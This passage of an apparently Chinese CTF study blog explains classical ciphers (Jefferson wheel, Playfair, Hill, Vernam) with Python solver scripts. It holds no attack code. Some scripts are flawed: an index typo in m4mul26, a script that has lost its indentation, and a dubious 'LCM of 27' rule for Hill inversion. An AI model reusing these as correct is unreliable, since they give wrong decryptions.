UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span></span><br><span class="line"><span class="string">11：&lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span></span><br><span class="line"><span class="string">12：&lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span></span><br><span class="line"><span class="string">13：&lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&quot;&quot;&quot;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">m = [<span class="string">&quot;&quot;</span>] * <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> mtable[i]:</span><br><span class="line">        <span class="keyword">if</span> str.isalpha(y):</span><br><span class="line">            m[i] += y</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>]</span><br><span class="line">message = <span class="string">&quot;NFQKSEVOQOFNP&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    x = key[i] - <span class="number">1</span> <span class="comment"># key[i] - 1</span></span><br><span class="line">    <span class="keyword">while</span> m[x][<span class="number">0</span>] != message[i]:</span><br><span class="line">        m[x] = m[x][<span class="number">1</span>:] + m[x][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        print(m[key[j] - <span class="number">1</span>][i].lower(), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h2><p>密钥生成</p><p>选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将I和J视作同一字。）</p><p>数据加密</p><p>将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。最后不足两位也补X或者Q。</p><p>1、若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。</p><p>2、若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。</p><p>3、若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。</p><p>数据解密</p><p>1、若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。</p><p>2、若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。</p><p>3、若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。</p><p>比如：</p><p>密钥crazy dog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p l a y f</span><br><span class="line"></span><br><span class="line">i r b c d</span><br><span class="line"></span><br><span class="line">e g h j k</span><br><span class="line"></span><br><span class="line">m n o q s</span><br><span class="line"></span><br><span class="line">t u v w x</span><br></pre></td></tr></table></figure><p>明文：where there is life,there is hope.</p><p>分组：wh er et he re is li fe th er ei sh op e</p><p>加密：KU YO XD OL OY PL FK DL FU YO LG LN NG LY</p><p>解密：where there is life,there is hope</p><p>python解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;密文&#39;).decipher(&#39;密钥&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).decipher(&#39;CGOCPMOFEBMLUNISEOZY&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>密钥：playfair。<br>密文：Dncnoqqfliqrpgeklwmppu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwxz&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>密钥：shiyanb</p><p>密文：KQSAMFPAOPMFPA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;shiyanbcdefgjklmopqrtuvwx&#39;).decipher(&#39;KQSAMFPAOPMFPA&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>总结：</p><p>我们在密钥生成的时候遵循将I和J视作同一字的原则，所以如果密钥中出现i或者j，就不能出现i或者j。第一个题我们是i和j都不出现，第二个题我们只出现了j，所以有些题还是要视情况而定。</p><p>密钥矩阵生成的时候可以横着写，也可以竖着写。</p><h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><p>原理：</p><p>希尔密码是运用基本矩阵论原理的替换密码。每个字母当作26进制数字：A=0，B=1…一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD 26。注意用作加密的矩阵（即密钥）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。</p><p>例如：设分组长度n=2，密钥为：K={7,9；8,3}，明文为：friday</p><p>加密过程为：</p><p>（1）将明文分为两两一组（因为n=2）：fr,id,ay</p><p>（2）将明文字母转换为对应的明文编码：（5,17），（8,3），（0,24）</p><p>（3）分别计算每一组明文对应的密文编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（5,17）*K mod 26 &#x3D;（15,16）</span><br><span class="line">（8,3） *K mod 26&#x3D;（2,5）</span><br><span class="line">（0,24） *K mod 26&#x3D;（10,20）</span><br></pre></td></tr></table></figure><p>（4）将密文编码转换为对应的密文字母，即pq，cf，ku</p><p>解密过程为：</p><p>（1）将密文分为两两一组：pq，cf，ku</p><p>（2）将密文字母转换为对应的编码：（15,16），（2,5），（10,20）</p><p>（3）分别计算每一组密文对应的明文编码（K-1位K的逆矩阵）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（15,16）*K-1 mod 26 &#x3D;（5,17）</span><br><span class="line">（2,5） *K -1mod 26&#x3D;（8,3）</span><br><span class="line">（10,20） *K-1 mod 26&#x3D;（0,24）</span><br></pre></td></tr></table></figure><p>（4）将明文编码转换为明文字母，完成解密。</p><p>前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、密文</span><br><span class="line"></span><br><span class="line">2、矩阵（也叫解密矩阵）</span><br></pre></td></tr></table></figure><p>步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、根据矩阵，求出逆矩阵。</span><br><span class="line"></span><br><span class="line">2、逆矩阵与密文对应的矩阵相乘。（一定要注意写密文矩阵的顺序）</span><br><span class="line"></span><br><span class="line">3、得到矩阵b,每一个数与26相余。</span><br><span class="line"></span><br><span class="line">4.得到的余数转ascii</span><br></pre></td></tr></table></figure><p>例子：</p><p>密文：dloguszijluswogany</p><p>矩阵：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line"></span><br><span class="line">0 1</span><br></pre></td></tr></table></figure><ul><li><p>求逆矩阵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from numpy import *</span><br><span class="line">a3&#x3D;mat([[1,2],[0,1]])</span><br><span class="line">print(a3)</span><br><span class="line">a4&#x3D;a3.I</span><br><span class="line">print(a4)</span><br><span class="line"></span><br><span class="line">[[ 1. -2.]</span><br><span class="line"> [ 0.  1.]]</span><br></pre></td></tr></table></figure></li><li><p>密文转化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d     l     o     g     u     s     z     i     j     l     u     s     w     o     g     a     n     y</span><br><span class="line">4    12     15    7     21    19    26    9     10    12    21    19    23    15    7     1    14    25</span><br></pre></td></tr></table></figure></li><li><p>逆矩阵与密文矩阵相乘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">a=mat([[<span class="number">1</span>,<span class="number">-2</span>],[<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line">b=mat([[<span class="number">4</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">26</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">14</span>],[<span class="number">12</span>,<span class="number">7</span>,<span class="number">19</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">19</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">25</span>]])</span><br><span class="line">c=a*b</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></li><li><p>矩阵mod26</p><p>拿到flag</p></li><li><p>求最小公倍数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bei</span>(<span class="params">num1,num2</span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,(num1 * num2)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % num1 == <span class="number">0</span> <span class="keyword">and</span> i % num2 == <span class="number">0</span>:</span><br><span class="line">            b.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> b[<span class="number">0</span>]</span><br><span class="line">num1=int(input())</span><br><span class="line">num2=int(input())</span><br><span class="line">print(bei(num1, num2))</span><br></pre></td></tr></table></figure><p>如果逆矩阵得到了分数。出现分数项则 *最小公倍数(27,|D|)  |D|为行列式的值。</p></li></ul><p>求行列式的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MatrixGetDet</span>(<span class="params">M</span>):</span></span><br><span class="line">    length = len(M)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> M[<span class="number">0</span>][<span class="number">0</span>]*M[<span class="number">1</span>][<span class="number">1</span>] - M[<span class="number">0</span>][<span class="number">1</span>]*M[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">import</span> itertools</span><br><span class="line">    <span class="comment"># sum positive</span></span><br><span class="line">    positive = <span class="number">0</span></span><br><span class="line">    indexer1 = itertools.cycle(range(length))</span><br><span class="line">    indexer2 = itertools.cycle(range(length))</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">        indexer1.next()</span><br><span class="line">        _tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">            index1 = indexer1.next()</span><br><span class="line">            index2 = indexer2.next()</span><br><span class="line">            _tmp *= M[index1][index2]</span><br><span class="line">        positive += _tmp</span><br><span class="line">    <span class="comment"># sum negative</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    indexer1 = itertools.cycle(range(length))</span><br><span class="line">    indexer2 = itertools.cycle(range(length)[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">        indexer1.next()</span><br><span class="line">        _tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">            index1 = indexer1.next()</span><br><span class="line">            index2 = indexer2.next()</span><br><span class="line">            _tmp *= M[index1][index2]</span><br><span class="line">        negative += _tmp</span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    <span class="keyword">return</span> positive - negative</span><br><span class="line">matrix1 = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> MatrixGetDet(matrix1)</span><br></pre></td></tr></table></figure><p>最终脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">dis=&#123;<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;b&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;c&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;d&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;e&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;f&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;g&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;h&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;i&#x27;</span>,<span class="number">10</span>:<span class="string">&#x27;j&#x27;</span>,<span class="number">11</span>:<span class="string">&#x27;k&#x27;</span>,<span class="number">12</span>:<span class="string">&#x27;l&#x27;</span>,<span class="number">13</span>:<span class="string">&#x27;m&#x27;</span>,<span class="number">14</span>:<span class="string">&#x27;n&#x27;</span>,<span class="number">15</span>:<span class="string">&#x27;o&#x27;</span>,<span class="number">16</span>:<span class="string">&#x27;p&#x27;</span>,<span class="number">17</span>:<span class="string">&#x27;q&#x27;</span>,<span class="number">18</span>:<span class="string">&#x27;r&#x27;</span>,<span class="number">19</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">20</span>:<span class="string">&#x27;t&#x27;</span>,<span class="number">21</span>:<span class="string">&#x27;u&#x27;</span>,<span class="number">22</span>:<span class="string">&#x27;v&#x27;</span>,<span class="number">23</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">24</span>:<span class="string">&#x27;x&#x27;</span>,<span class="number">25</span>:<span class="string">&#x27;y&#x27;</span>,<span class="number">26</span>:<span class="string">&#x27;z&#x27;</span>&#125;</span><br><span class="line">f=mat([[<span class="number">8</span>,<span class="number">16</span>,<span class="number">27</span>],[<span class="number">8</span>,<span class="number">99</span>,<span class="number">24</span>],[<span class="number">27</span>,<span class="number">24</span>,<span class="number">27</span>]])</span><br><span class="line">e=mat([[<span class="number">22</span>,<span class="number">9</span>,<span class="number">0</span>],[<span class="number">12</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">10</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">8</span>,<span class="number">1</span>,<span class="number">17</span>]])</span><br><span class="line">g=e*f</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        k=(g[i][j])%<span class="number">26</span>+<span class="number">1</span></span><br><span class="line">        l=dis[k]</span><br><span class="line">        flag+=l</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Start</span>():</span></span><br><span class="line"></span><br><span class="line">opt = OptionParser()</span><br><span class="line"></span><br><span class="line">opt.add_option(<span class="string">&#x27;-k&#x27;</span>,dest=<span class="string">&#x27;key&#x27;</span>,help=<span class="string">&quot;Input your matrix&quot;</span>)</span><br><span class="line"></span><br><span class="line">opt.add_option(<span class="string">&#x27;-p&#x27;</span>,dest=<span class="string">&#x27;pw&#x27;</span>,help=<span class="string">&quot;Input your passwd&quot;</span>)</span><br><span class="line"></span><br><span class="line">options,args = opt.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> options.pw <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> options.key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Use \&#x27;-h\&#x27; to get help&#x27;</span></span><br><span class="line"></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> options</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ForKey</span>(<span class="params">key</span>):</span></span><br><span class="line"></span><br><span class="line">key = mat(key)</span><br><span class="line"></span><br><span class="line">key = key.I.T</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;key is :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ForPw</span>(<span class="params">pw,lenght</span>):</span></span><br><span class="line"></span><br><span class="line">result = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pw)/lenght)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pw)/lenght):</span><br><span class="line"></span><br><span class="line">string = pw[i*lenght:(i+<span class="number">1</span>)*lenght]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.isalpha():</span><br><span class="line"></span><br><span class="line">s = ord(s) - <span class="number">96</span></span><br><span class="line"></span><br><span class="line">result[i].append(s)</span><br><span class="line"></span><br><span class="line">result = mat(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;password matrix is:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Deal</span>(<span class="params">start</span>):</span></span><br><span class="line"></span><br><span class="line">key = start.key</span><br><span class="line"></span><br><span class="line">pw = start.pw</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pw.isalpha():</span><br><span class="line"></span><br><span class="line">judge = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">key = ForKey(key)</span><br><span class="line"></span><br><span class="line">result = ForPw(pw,len(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> key,result,judge</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">key,result,judge</span>):</span></span><br><span class="line"></span><br><span class="line">get = result * key</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The result matrix is:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line">get = array(get)</span><br><span class="line"></span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> get:</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line"></span><br><span class="line">one = int(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> one &lt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">one = one + <span class="number">26</span></span><br><span class="line"></span><br><span class="line">one = one + <span class="number">96</span></span><br><span class="line"></span><br><span class="line">string = string + chr(one)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The final result is:\n&#x27;</span> + string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">start = Start()</span><br><span class="line"></span><br><span class="line">key,result,judge = Deal(start)</span><br><span class="line"></span><br><span class="line">Exploit(key,result,judge)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def m4mul26(m, y):</span><br><span class="line">    return [(m[0][0]*y[0]+m[0][1]*y[1]+m[0][2]*y[2]+m[0][3]*y[3])%26,</span><br><span class="line">             (m[1][0]*y[0]+m[1][1]*y[1]+m[1][2]*y[2]+m[1][3]*y[3])%26,</span><br><span class="line">             (m[2][0]*y[0]+m[2][1]*y[1]+m[2][2]*y[2]+m[2][3]*y[3])%26,</span><br><span class="line">             (m[2][0]*y[0]+m[3][1]*y[1]+m[3][2]*y[2]+m[3][3]*y[3])%26,]</span><br><span class="line"></span><br><span class="line">dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#39;</span><br><span class="line">b &#x3D; [[1, -1, 0, 0],</span><br><span class="line">    [0, 1, -1, 0],</span><br><span class="line">    [0, 0, 1, -1],</span><br><span class="line">    [0, 0, 0, 1]]</span><br><span class="line">c &#x3D; &#39;kdptxjveinjsqmmapwfx&#39;</span><br><span class="line">m &#x3D; &#39;&#39;</span><br><span class="line">for i in xrange(0,len(c),4):</span><br><span class="line">    test &#x3D; [dic.index(c[i]),dic.index(c[i+1]),dic.index(c[i+2]),dic.index(c[i+3])]</span><br><span class="line">    res &#x3D; m4mul26(b,test)</span><br><span class="line">    m &#x3D; m + dic[res[0]] + dic[res[1]] + dic[res[2]] + dic[res[3]]</span><br><span class="line">print m</span><br></pre></td></tr></table></figure><p>总结：</p><p>1.在转换逆矩阵的时候，如果出现了分数或者小数。我们需要将逆矩阵乘以27和d(给我们的矩阵的行列式)的最小公倍数。</p><p>2.加密矩阵如果是 2 × 2 的方阵，明文就要每两个为列，组成 2 × n 的矩阵。</p><h2 id="德军密码-费娜姆密码"><a href="#德军密码-费娜姆密码" class="headerlink" title="德军密码([费娜姆密码])"></a>德军密码([<strong>费娜姆密码</strong>])</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 